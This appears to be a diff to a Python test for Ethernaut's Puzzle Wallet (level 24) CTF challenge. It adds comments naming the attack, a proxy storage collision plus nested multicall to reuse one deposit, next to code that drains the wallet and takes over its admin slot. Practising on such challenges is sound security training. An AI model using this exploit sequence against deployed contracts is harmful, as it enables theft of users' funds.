@@ -11,6 +11,9 @@ def test_lv24():
     ethernaut.check_lv24(contract)
 
 def exploit_lv24(contract: PuzzleProxy, attacker: Account):
+    # Attack vector: storage collisions + passing multicall to multicall to evade the check of using deposti function multiple times
+    # Training: combining multiple techniques together
+
     wallet = PuzzleWallet(contract)
 
     simple_deposit_selector    = Abi.encode_with_selector(wallet.deposit.selector, [], [])
@@ -21,4 +24,3 @@ def exploit_lv24(contract: PuzzleProxy, attacker: Account):
     wallet.multicall([simple_deposit_selector, multicall_deposit_selector], value=10 * 10**18)
     wallet.execute(attacker, 20 * 10**18, bytes())
     wallet.setMaxBalance(int(str(attacker.address), 16))
-    
